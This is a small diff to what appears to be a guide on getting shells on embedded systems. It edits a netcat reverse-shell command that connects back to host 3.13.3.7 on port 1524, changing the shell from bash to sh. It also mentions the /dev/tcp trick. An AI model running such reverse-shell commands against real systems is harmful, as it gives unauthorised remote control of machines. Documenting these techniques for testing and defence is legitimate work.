@@ -1135,7 +1135,7 @@ Embedded systems do not always have Bash and the */dev/tcp/* trick will not work
 On the remote system:
 
 ```sh
-nc -e /bin/bash -vn 3.13.3.7 1524
+nc -e /bin/sh -vn 3.13.3.7 1524
 ```
 
 Variant if *'-e'* is not supported:
